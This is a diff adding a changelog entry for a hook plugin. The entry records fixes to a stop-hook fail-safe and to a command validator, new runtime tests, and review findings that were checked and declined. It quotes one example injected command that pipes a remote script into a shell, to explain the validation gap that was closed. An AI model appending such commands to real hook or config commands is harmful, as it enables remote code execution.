@@ -1,5 +1,24 @@
 # Changelog
 
+## [0.1.12] - 2026-08-22
+
+### Fixed
+- `stop-checkpoint.js`: an empty or unparseable stdin (I/O hiccup, timing, or a schema change) fell through to the block branch instead of being treated like `stop_hook_active: true` — the exact failure mode the loop guard exists to prevent. Now fails toward *not* blocking. Found by adversarial review; regression-tested in the new `tests/test_hooks_runtime.py`.
+- `scripts/validate_distribution.py`'s `validate_hooks()`: the `${CLAUDE_PLUGIN_ROOT}` path check joined the reference without resolving or enforcing containment, so `../../outside.js` could pass validation whenever a file happened to exist at that escaped path, and content appended after the quoted segment (`&& curl evil.sh | sh`) went unexamined. Both closed: the whole command is now anchored end-to-end (`^<word> "${CLAUDE_PLUGIN_ROOT}/path"$`, nothing else permitted) and the resolved path must stay under the plugin directory. Found independently by 3 review passes (security specialist, Claude adversarial, Codex structured review) — cross-confirmed, not a single-source guess. Two new regression tests.
+
+### Added
+- `tests/test_hooks_runtime.py`: the 3 shipped hook scripts had zero behavioral test coverage since 0.1.9 (only the manifest structure was validated, never actually running `node` against them) — closed via subprocess-based tests covering the block/no-block/fail-safe paths for all three hooks.
+- `plugins/checkpoint/hooks/lib/read-stdin-json.js`: the stdin-read-and-parse boilerplate was duplicated near-verbatim between `pre-compact-reminder.js` and `stop-checkpoint.js` (maintainability specialist finding) — extracted to one shared helper. Also adds a 64KB stdin size cap (unbounded buffering was a security-specialist finding) and treats non-object parsed JSON as a failed read.
+- Named `STDIN_READ_TIMEOUT_MS` constant in both callers, with a comment tying it to the `timeout: 3` (3000ms) budget each hook is given in `hooks.json` — previously a bare `2000` literal duplicated in two files with no link to the process budget it has to stay under (maintainability specialist finding).
+- All three hooks now set `process.exitCode` instead of calling `process.exit()` immediately after `process.stdout.write()`, so Node exits only once the write has actually flushed (Claude/Codex adversarial finding: `exit()` can terminate before an async pipe write completes).
+- `tests/test_distribution.py`: deduplicated the repeated temp-plugin-directory setup across hook-validator tests into `_write_hooks_manifest()` (maintainability specialist finding).
+
+### Reviewed, not changed
+- Codex adversarial claimed (citing an unverifiable "25 probes") that Claude Code's `Stop` hook fires after every assistant turn, not just at genuine stop/pause points — which would make `stop-checkpoint.js`'s design fundamentally broken. Its only two live `exec` attempts during that review were both rejected by its own sandbox, so the "25 probes" figure has no shown evidence behind it. Independent verification against official docs was inconclusive either way. Direct empirical evidence from this repo's own development session (the hook was live across dozens of turns and fired exactly twice, not on every turn) contradicts the claim. Not acted on, but not fully closed either — revisit if the hook is ever observed blocking more often than genuine stop points warrant.
+- Codex claimed release-version validation omits the Codex marketplace file's version. Checked: `.agents/plugins/marketplace.json` has no version field at all — nothing to validate there. Claim rested on a false premise.
+- Codex claimed the shell-form `${CLAUDE_PLUGIN_ROOT}` command in `hooks.json` (vs. exec-form with `args`) is non-standard/unsafe. Contradicted by real, currently-active third-party plugins on this machine (`context-mode`, `astronomer-data`) using the identical shell-embedded form — not changed.
+- Mixed-evidence profile-precedence rule (0.1.10): Codex raised a legitimate design question (deciding solely by `Next action` can drop the other profile's fields when the next action later shifts domains) — a real critique of the rule's stability, not a code bug. No fixture proves or disproves it yet; left as an open design question rather than acted on speculatively.
+
 ## [0.1.11] - 2026-08-22
 
 ### Added
